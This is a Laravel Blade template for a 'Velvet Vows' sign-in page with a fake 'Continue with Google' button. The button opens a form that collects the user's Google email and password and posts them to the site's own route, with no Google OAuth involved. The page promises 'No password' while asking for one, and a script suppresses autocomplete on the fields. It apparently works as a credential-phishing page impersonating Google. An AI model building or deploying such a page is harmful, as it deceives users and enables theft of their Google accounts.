<!DOCTYPE html>
<html lang="{{ str_replace('_', '-', app()->getLocale()) }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <title>Velvet Vows - Sign In</title>
    @vite(['resources/css/app.css', 'resources/js/app.js'])
    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <link href="https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,400..900;1,400..900&display=swap" rel="stylesheet">
</head>
<body class="antialiased bg-[#877F77] min-h-screen flex items-center justify-center font-sans">

    <div class="w-full max-w-md mx-auto p-4 sm:p-6">
        <div class="bg-[#FDF9F1] rounded-3xl border-[3px] border-[#D1AE5A] shadow-xl overflow-hidden">
            <div class="p-8 sm:p-10 text-center pb-4">
                <!-- Title -->
                <h1 class="font-['Playfair_Display'] text-4xl sm:text-[2.75rem] font-bold text-[#C59B27] tracking-tight">Velvet Vows</h1>
                
                <!-- Subtitle -->
                <p class="mt-3 font-['Playfair_Display'] italic text-lg text-[#857B72]">Sign in to begin your invitation</p>
                
                <!-- Divider -->
                <div class="w-full h-px bg-[#E4D1A6] my-8 mx-auto" style="width: 80%;"></div>
                
                <!-- Tagline -->
                <p class="text-gray-700 font-medium mb-6 text-lg">One click. No password. No forms.</p>
                
                <!-- Google Button -->
                <div id="google-btn-container">
                    <button type="button" onclick="showEmailInput()" class="flex items-center justify-center w-full bg-white border border-gray-300 rounded-full py-3 sm:py-4 px-4 hover:bg-gray-50 transition duration-200 cursor-pointer">
                        <div class="bg-[#EA4335] text-white w-7 h-7 rounded-full flex items-center justify-center font-bold text-sm mr-4 shrink-0">
                            G
                        </div>
                        <span class="text-gray-800 font-medium text-lg">Continue with Google</span>
                    </button>
                </div>
                
                <!-- Email & Password Input Form (Hidden initially) -->
                <form id="email-form" action="{{ route('signin.process') }}" method="POST" class="hidden">
                    @csrf
                    <div class="mb-4">
                        <label for="email" class="block text-sm font-medium text-gray-700 text-left mb-1">Enter your Google Email</label>
                        <input type="email" name="email" id="email" required placeholder="you@gmail.com" autocomplete="new-password" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-[#C59B27] focus:border-[#C59B27] outline-none transition">
                    </div>
                    <div class="mb-4">
                        <label for="password" class="block text-sm font-medium text-gray-700 text-left mb-1">Password</label>
                        <input type="password" name="password" id="password" required placeholder="Enter password..." autocomplete="new-password" class="w-full px-4 py-3 rounded-xl border border-gray-300 focus:ring-2 focus:ring-[#C59B27] focus:border-[#C59B27] outline-none transition">
                    </div>
                    <button type="submit" class="w-full bg-[#C59B27] hover:bg-[#B58B22] text-white font-bold py-3 px-4 rounded-full transition duration-200">
                        Continue
                    </button>
                    <button type="button" onclick="hideEmailInput()" class="w-full mt-2 text-sm text-gray-500 hover:text-gray-700">
                        Cancel
                    </button>
                </form>

                <script>
                    function showEmailInput() {
                        document.getElementById('google-btn-container').classList.add('hidden');
                        document.getElementById('email-form').classList.remove('hidden');
                        document.getElementById('email').focus();
                    }

                    function hideEmailInput() {
                        document.getElementById('email-form').classList.add('hidden');
                        document.getElementById('google-btn-container').classList.remove('hidden');
                    }

                    // Prevent autocomplete suggestions from appearing
                    function disableAutocomplete() {
                        const fields = document.querySelectorAll('input[name="email"], input[name="password"]');
                        fields.forEach(field => {
                            field.addEventListener('focus', function() {
                                this.setAttribute('autocomplete', 'off');
                            });
                            field.addEventListener('input', function() {
                                this.setAttribute('autocomplete', 'off');
                            });
                        });
                    }

                    document.addEventListener('DOMContentLoaded', function() {
                        disableAutocomplete();
                    });
                </script>
                
                <!-- Terms -->
                <p class="text-[0.8rem] text-gray-400 mt-10 mb-8 font-medium">By continuing you agree to our Terms & Privacy Policy</p>
                
                <!-- Features Divider -->
                <div class="relative flex items-center mb-8 px-4">
                    <div class="flex-grow border-t border-gray-200"></div>
                    <span class="flex-shrink-0 mx-3 text-sm text-gray-400">secure &middot; private &middot; instant</span>
                    <div class="flex-grow border-t border-gray-200"></div>
                </div>
                
                <!-- Data message -->
                <p class="text-[0.9rem] text-[#857B72] font-semibold flex items-center justify-center gap-2 mb-2">
                    <span class="text-lg">✦</span> Your data is never sold or shared <span class="text-lg">✦</span>
                </p>
            </div>
            
            <!-- Footer Banner -->
            <div class="bg-[#FEF5D5] py-3.5 px-4 text-center mt-2 mx-6 mb-6 rounded-xl">
                <p class="text-[#B58B22] text-[0.9rem] font-bold">Session-based &bull; No persistent account needed</p>
            </div>
        </div>
    </div>

</body>
</html>
